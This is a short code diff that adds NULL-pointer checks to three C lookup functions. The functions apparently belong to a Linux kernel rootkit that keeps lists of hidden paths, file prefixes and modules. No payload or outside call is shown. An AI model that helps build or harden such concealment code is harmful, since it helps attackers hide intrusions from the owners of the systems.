@@ -56,6 +56,10 @@ is_path_hidden(char *name)
 	struct file_name *cur;
 	struct list_head *cursor;
 	
+	if(name == NULL) {
+		return 0;
+	}
+		
 	list_for_each(cursor, &paths) {
 		cur = list_entry(cursor, struct file_name, list);
 		if(strcmp(cur->name, name) == 0) {
@@ -115,6 +119,10 @@ is_prefix_hidden(char *name)
 	struct file_prefix *cur;
 	struct list_head *cursor;
 	
+	if(name == NULL) {
+		return 0;
+	}
+		
 	list_for_each(cursor, &prefixes) {
 		cur = list_entry(cursor, struct file_prefix, list);
 		if(strcmp(cur->name, name) == 0) {
@@ -338,6 +346,10 @@ is_module_hidden(char *name)
 	struct modules *cur;
 	struct list_head *cursor;
 	
+	if(name == NULL) {
+		return 0;
+	}
+		
 	list_for_each(cursor, &modules) {
 		cur = list_entry(cursor, struct modules, list);
 		if(strcmp(cur->name, name) == 0) {
